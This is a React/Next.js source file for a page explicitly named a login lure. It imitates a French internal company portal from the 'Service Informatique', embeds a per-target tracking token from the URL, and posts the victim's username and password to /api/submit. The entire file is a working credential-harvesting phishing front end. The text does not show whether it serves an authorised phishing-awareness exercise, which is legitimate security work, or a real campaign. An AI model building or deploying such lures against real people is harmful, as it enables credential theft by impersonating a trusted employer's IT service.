type SearchParams = Promise<{ [key: string]: string | string[] | undefined }>;

export default async function LoginLurePage({
  searchParams,
}: {
  searchParams: SearchParams;
}) {
  const params = await searchParams;
  const tokenRaw = params.t ?? params.token;
  const token = Array.isArray(tokenRaw) ? tokenRaw[0] : tokenRaw ?? "";

  return (
    <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-100 to-slate-200 px-4">
      <div className="w-full max-w-sm">
        <div className="bg-white rounded-2xl shadow-xl border border-slate-200 p-8">
          <div className="flex flex-col items-center mb-6">
            <div className="h-12 w-12 rounded-xl bg-blue-600 flex items-center justify-center mb-3">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                strokeWidth="2"
                className="h-6 w-6"
              >
                <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
            </div>
            <h1 className="text-xl font-semibold text-slate-800">
              Portail Interne
            </h1>
            <p className="text-sm text-slate-500 mt-1">
              Connectez-vous pour continuer
            </p>
          </div>

          <form action="/api/submit" method="POST" className="space-y-4">
            <input type="hidden" name="token" value={token} />
            <div>
              <label
                htmlFor="identifier"
                className="block text-sm font-medium text-slate-700 mb-1"
              >
                Identifiant
              </label>
              <input
                id="identifier"
                name="identifier"
                type="text"
                required
                autoComplete="off"
                className="w-full rounded-lg border border-slate-300 px-3 py-2 text-slate-900 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none"
                placeholder="prenom.nom"
              />
            </div>
            <div>
              <label
                htmlFor="password"
                className="block text-sm font-medium text-slate-700 mb-1"
              >
                Mot de passe
              </label>
              <input
                id="password"
                name="password"
                type="password"
                required
                className="w-full rounded-lg border border-slate-300 px-3 py-2 text-slate-900 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none"
                placeholder="••••••••"
              />
            </div>
            <button
              type="submit"
              className="w-full rounded-lg bg-blue-600 hover:bg-blue-700 transition-colors text-white font-medium py-2.5"
            >
              Se connecter
            </button>
          </form>

          <p className="text-xs text-slate-400 text-center mt-6">
            © {new Date().getFullYear()} Service Informatique
          </p>
        </div>
      </div>
    </main>
  );
}
